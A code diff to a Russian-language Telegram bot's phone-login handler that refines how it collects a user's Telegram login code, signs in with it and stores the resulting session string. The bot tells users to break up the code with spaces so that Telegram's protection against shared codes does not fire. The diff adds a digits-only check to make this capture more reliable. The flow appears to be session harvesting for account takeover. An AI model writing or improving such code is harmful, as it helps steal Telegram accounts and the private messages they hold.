@@ -1516,7 +1516,7 @@ async def process_phone(message: types.Message, state: FSMContext):
                 await state.update_data(phone=phone)
                 await state.update_data(phone_code_hash=phone_code_hash)
                 db.update_states_sms(user_id, 2)
-                await message.reply("Теперь отправьте код, который вы получили от Telegram.\n\nВажно! Пожалуйста, НЕ присылай мне код как есть (иначе он сразу перестанет действовать). Пришли мне его, разделив цифры пробелами или любыми другими символами. Например, 123 45 или 1 2345 или 123a45, где 12345 - это сам код, который ты получил от Телеграма.")
+                await message.reply("Теперь отправьте код, который вы получили от Telegram.\n\nВажно! Пожалуйста, НЕ присылай мне код как есть (иначе он сразу перестанет действовать). Пришли мне его, разделив цифры пробелами. Например, 123 45 или 1 2345, где 12345 - это сам код, который ты получил от Телеграма.")
             except Exception as e:
                 logging.error(f"Ошибка при отправке кода: {e}")
                 await message.reply("Произошла ошибка при отправке кода, пожалуйста, попробуйте еще раз ввести номер телефона:")
@@ -1527,6 +1527,7 @@ async def process_phone(message: types.Message, state: FSMContext):
             phone = data.get("phone")
             phone_code_hash = data.get("phone_code_hash")
             try:
+                int(code)
                 await client.sign_in(phone, int(code), phone_code_hash=phone_code_hash)
                 string_session = client.session.save()
                 await state.update_data(string_session=string_session)
@@ -1541,6 +1542,8 @@ async def process_phone(message: types.Message, state: FSMContext):
             except PhoneNumberUnoccupiedError:
                 await message.reply("Этот номер телефона не зарегистрирован в Telegram.", reply_markup=markup_reply)
                 await state.finish()
+            except ValueError:
+                await message.answer("Произошла ошибка! Код должен состоять исключительно из цифр, пожалуйста повторите попытку:")
             except Exception as e:
                 await message.reply(f"Произошла ошибка: {str(e)}", reply_markup=markup_reply)
                 await state.finish()
